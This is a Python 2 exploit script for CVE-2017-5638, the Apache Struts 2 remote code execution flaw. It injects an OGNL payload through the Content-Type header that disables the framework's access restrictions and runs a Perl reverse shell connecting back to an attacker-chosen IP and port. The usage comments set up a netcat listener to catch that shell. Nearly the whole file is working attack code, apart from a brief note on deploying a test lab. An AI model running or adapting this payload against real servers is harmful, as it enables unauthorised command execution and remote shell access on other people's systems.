# CVE-2017-5638
# Apache Struts 2 Vulnerability Remote Code Execution
# Reverse shell from target
# Author: anarc0der - github.com/anarcoder
# Tested with tomcat8

# Install tomcat8
# Deploy WAR file https://github.com/nixawk/labs/tree/master/CVE-2017-5638

# Ex:
# Open: $ nc -lnvp 4444
# python2 struntsrce.py --target=http://www.example.com/struts2_2.3.15.1-showcase/showcase.action --ip=127.0.0.1 --port=4444

"""
Usage:
    struntsrce.py --target=<arg> --ip=<arg> --port=<arg>
    struntsrce.py --help
    struntsrce.py --version

Options:
    -h --help                                Open help menu
    -v --version                             Show version
Required options:
    --target='url target'                    your target :)
    --ip='10.10.10.1'                        your ip
    --port=4444                              open port for back connection

"""

import urllib2
import httplib
import os
import sys
from docopt import docopt, DocoptExit


class CVE_2017_5638():

    def __init__(self, p_target, p_ip, p_port):
        self.target = p_target
        self.ip = p_ip
        self.port = p_port
        self.revshell = self.generate_revshell()
        self.payload = self.generate_payload()
        self.exploit()

    def generate_revshell(self):
        revshell = "perl -e \\'use Socket;$i=\"{0}\";$p={1};"\
                   "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"\
                   "if(connect(S,sockaddr_in($p,inet_aton($i)))){{open"\
                   "(STDIN,\">&S\");open(STDOUT,\">&S\");"\
                   "open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};\\'"
        return revshell.format(self.ip, self.port)

    def generate_payload(self):
        payload = "%{{(#_='multipart/form-data')."\
                  "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."\
                  "(#_memberAccess?"\
                  "(#_memberAccess=#dm):"\
                  "((#container=#context['com.opensymphony.xwork2."\
                  "ActionContext.container'])."\
                  "(#ognlUtil=#container.getInstance(@com.opensymphony."\
                  "xwork2.ognl.OgnlUtil@class))."\
                  "(#ognlUtil.getExcludedPackageNames().clear())."\
                  "(#ognlUtil.getExcludedClasses().clear())."\
                  "(#context.setMemberAccess(#dm))))."\
                  "(#cmd='{0}')."\
                  "(#iswin=(@java.lang.System@getProperty('os.name')."\
                  "toLowerCase().contains('win')))."\
                  "(#cmds=(#iswin?{{'cmd.exe','/c',#cmd}}:"\
                  "{{'/bin/bash','-c',#cmd}}))."\
                  "(#p=new java.lang.ProcessBuilder(#cmds))."\
                  "(#p.redirectErrorStream(true)).(#process=#p.start())."\
                  "(#ros=(@org.apache.struts2.ServletActionContext@get"\
                  "Response().getOutputStream()))."\
                  "(@org.apache.commons.io.IOUtils@copy"\
                  "(#process.getInputStream(),#ros)).(#ros.flush())}}"
        return payload.format(self.revshell)

    def exploit(self):
        try:
            # Set proxy for debug request, just uncomment these lines 
            # Change the proxy port

            #proxy = urllib2.ProxyHandler({'http': '127.0.0.1:8081'})
            #opener = urllib2.build_opener(proxy)
            #urllib2.install_opener(opener)

            headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64)'
                                     ' AppleWebKit/537.36 (KHTML, like Gecko)'
                                     ' Chrome/55.0.2883.87 Safari/537.36',
                       'Content-Type': self.payload}
            xpl = urllib2.Request(self.target, headers=headers)
            body = urllib2.urlopen(xpl).read()
        except httplib.IncompleteRead as b:
            body = b.partial
        print body


def main():
    try:
        arguments = docopt(__doc__, version="Apache Strunts RCE Exploit")
        target = arguments['--target']
        ip = arguments['--ip']
        port = arguments['--port']
    except DocoptExit as e:
        os.system('python struntsrce.py --help')
        sys.exit(1)

    CVE_2017_5638(target, ip, port)


if __name__ == '__main__':
    main()

